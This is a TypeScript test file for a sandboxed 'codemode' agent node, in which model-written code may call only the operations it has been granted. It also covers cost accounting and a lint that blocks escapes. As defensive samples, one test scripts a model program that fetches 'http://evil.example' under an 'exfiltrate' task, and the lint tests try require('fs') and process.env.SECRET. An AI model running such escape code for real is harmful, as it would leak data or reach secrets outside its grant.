/**
 * `codemode` — the node whose action space is code. What these pin is not "it ran": it is the
 * three properties a prompt-only code mode cannot have — the API is the grant, the host owns
 * where code runs, and every operation's spend reaches the kernel's settlement.
 */
import { describe, expect, it, vi } from 'vitest'
import { InMemoryResultBlobStore, InMemorySpawnJournal } from '../../src/durable/spawn-journal'
import {
  agentKind,
  assertAuthoredCode,
  type CodeAuthor,
  codemodeKind,
  createGraphEngine,
  type EngineGraphSpec,
  inlineCodeRunner,
  renderCodeApi,
  runEngineGraph,
  scriptKind,
  subgraphKind,
  supervisorKind,
} from '../../src/runtime/graph'

const budget = { maxIterations: 40, maxTokens: 100_000 }
const perNode = { maxIterations: 6, maxTokens: 20_000 }

/** A scripted author: no credentials, no network — the reply is whatever the test decides. */
const author = (text: string, spend?: { input: number; output: number }): CodeAuthor => ({
  complete: vi.fn(async () => ({
    text,
    ...(spend
      ? {
          spend: {
            iterations: 1,
            tokens: { input: spend.input, output: spend.output },
            usd: 0,
            ms: 0,
          },
        }
      : {}),
  })),
})

const engine = (effects: Record<string, unknown>) =>
  createGraphEngine({
    coreKinds: [
      agentKind({}),
      supervisorKind({
        blobs: new InMemoryResultBlobStore(),
        makeWorkerAgent: () => ({ name: 'x', act: async () => 1 }),
      }),
      scriptKind(),
      subgraphKind(),
    ],
    kinds: [codemodeKind()],
    effects,
  })

/** Two granted operations, both counting their calls so a test can prove the LOOP was in code. */
function shop() {
  const calls: string[] = []
  return {
    calls,
    operations: [
      {
        name: 'priceOf',
        signature: 'priceOf(sku: string): Promise<number>',
        description: 'the unit price for a sku',
        call: async (...args: ReadonlyArray<unknown>) => {
          calls.push(`priceOf:${String(args[0])}`)
          return { value: { a: 3, b: 5, c: 7 }[String(args[0])] ?? 0 }
        },
      },
      {
        name: 'stockOf',
        signature: 'stockOf(sku: string): Promise<number>',
        description: 'units on hand for a sku',
        call: async (...args: ReadonlyArray<unknown>) => {
          calls.push(`stockOf:${String(args[0])}`)
          return {
            value: { a: 2, b: 0, c: 4 }[String(args[0])] ?? 0,
            // A metered operation reports what it cost; the node totals these.
            spend: { iterations: 0, tokens: { input: 1, output: 0 }, usd: 0, ms: 0 },
          }
        },
      },
    ],
  }
}

const INVENTORY_PROGRAM = `
  const skus = ['a', 'b', 'c']
  let total = 0
  for (const sku of skus) {
    const stock = await stockOf(sku)
    if (stock === 0) continue
    total += stock * (await priceOf(sku))
  }
  return { total }
`

describe('codemode — one model turn, a loop the model could not express as a tool call', () => {
  it('runs the authored program in a graph and settles with its return value', async () => {
    const { calls, operations } = shop()
    const spec: EngineGraphSpec = {
      nodes: [
        {
          id: 'value-inventory',
          kind: 'codemode/v1',
          config: { task: 'total the value of in-stock skus', operations },
          deliverable: { check: (out: unknown) => (out as { total: number }).total === 34 },
        },
      ],
      edges: [],
    }
    const model = author(`\`\`\`js\n${INVENTORY_PROGRAM}\n\`\`\``)
    const res = await runEngineGraph(
      engine({ model, codeRunner: inlineCodeRunner() }),
      spec,
      'go',
      { budget, perNode },
    )
    expect(res.kind).toBe('winner')
    if (res.kind !== 'winner') return
    // 2*3 + 4*7 = 34, with `b` skipped by the program's own branch.
    expect(res.out).toEqual({ total: 34 })
    // ONE model call for six operation calls — that is the whole point of code mode.
    expect(model.complete).toHaveBeenCalledTimes(1)
    expect(calls).toEqual(['stockOf:a', 'priceOf:a', 'stockOf:b', 'stockOf:c', 'priceOf:c'])
  })

  it("every operation's spend reaches the kernel's settlement — accounting is not bypassed", async () => {
    const { operations } = shop()
    const spec: EngineGraphSpec = {
      nodes: [
        {
          id: 'value-inventory',
          kind: 'codemode/v1',
          config: { task: 'total', operations },
          deliverable: { check: () => true },
        },
      ],
      edges: [],
    }
    const journal = new InMemorySpawnJournal()
    const res = await runEngineGraph(
      engine({
        model: author(`\`\`\`\n${INVENTORY_PROGRAM}\n\`\`\``, { input: 100, output: 40 }),
        codeRunner: inlineCodeRunner(),
      }),
      spec,
      'go',
      // A real journal, so this reads what the KERNEL recorded, not what the node returned.
      { budget, perNode, journal, runId: 'codemode-spend' },
    )
    expect(res.kind).toBe('winner')
    const settled = ((await journal.loadTree('codemode-spend')) ?? []).filter(
      (event) => event.kind === 'settled' && event.id !== 'codemode-spend',
    )
    expect(settled).toHaveLength(1)
    const spent = (settled[0] as { spent: { tokens: { input: number; output: number } } }).spent
    // 100 input from the ONE model call, plus 1 input from each of the three metered stockOf
    // calls the program made: an operation's cost lands in the kernel's record, not lost in code.
    expect(spent.tokens).toEqual({ input: 103, output: 40 })
  })

  it('the API the model is SHOWN is generated from the grant, so the two cannot disagree', () => {
    const { operations } = shop()
    const doc = renderCodeApi({ task: 'total the inventory', operations })
    expect(doc).toContain('priceOf(sku: string): Promise<number>')
    expect(doc).toContain('stockOf(sku: string): Promise<number>')
    expect(doc).toContain('TASK: total the inventory')
    // Nothing else is advertised — an ungranted call cannot be described into existence.
    expect(doc).not.toMatch(/\bdeleteEverything\b/)
  })

  it('refuses an escape BEFORE running it, so a bad program costs the model call only', async () => {
    const { calls, operations } = shop()
    const spec: EngineGraphSpec = {
      nodes: [
        {
          id: 'sneaky',
          kind: 'codemode/v1',
          config: { task: 'exfiltrate', operations },
          deliverable: { check: () => true },
        },
      ],
      edges: [],
    }
    const res = await runEngineGraph(
      engine({
        model: author('```js\nreturn await fetch("http://evil.example")\n```'),
        codeRunner: inlineCodeRunner(),
      }),
      spec,
      'go',
      { budget, perNode },
    )
    expect(res.kind).toBe('no-winner')
    const settle = res.settles.find((entry) => entry.node === 'sneaky')
    expect(settle?.status).toBe('down')
    expect(settle?.reason).toMatch(/rejected: network access/)
    expect(calls).toEqual([])
  })

  it('a node granting no operation, or a program with no code, refuses by name', () => {
    const kind = codemodeKind()
    expect(() => kind.validateConfig({ task: 't', operations: [] }, 'n')).toThrow(
      /must grant at least one operation/,
    )
    expect(() => kind.validateConfig({ task: '', operations: [{}] }, 'n')).toThrow(
      /task must be a non-empty string/,
    )
    expect(() =>
      kind.validateConfig(
        { task: 't', operations: [{ name: 'not an id', call: () => ({ value: 1 }) }] },
        'n',
      ),
    ).toThrow(/is not a JS identifier/)
  })

  it('the lint refuses the escapes it claims to, and allows a named import when granted', () => {
    expect(() => assertAuthoredCode('const x = require("fs")')).toThrow(/require\(\)/)
    expect(() => assertAuthoredCode('process.env.SECRET')).toThrow(/process access/)
    expect(() => assertAuthoredCode('import fs from "node:fs"')).toThrow(/foreign import/)
    expect(() =>
      assertAuthoredCode("import { shot } from '@tangle-network/agent-runtime/kernel'", {
        allowedImports: ['@tangle-network/agent-runtime/kernel'],
      }),
    ).not.toThrow()
  })

  it('the host owns WHERE code runs: the kind supplies no runner and says so', async () => {
    const { operations } = shop()
    const spec: EngineGraphSpec = {
      nodes: [
        {
          id: 'no-runner',
          kind: 'codemode/v1',
          config: { task: 't', operations },
          deliverable: { check: () => true },
        },
      ],
      edges: [],
    }
    // The engine refuses BEFORE spending: a declared effect the host did not provide.
    await expect(
      runEngineGraph(engine({ model: author('```\nreturn 1\n```') }), spec, 'go', {
        budget,
        perNode,
      }),
    ).rejects.toThrow(/needs effect\(s\) codeRunner the host did not provide/)
  })
})
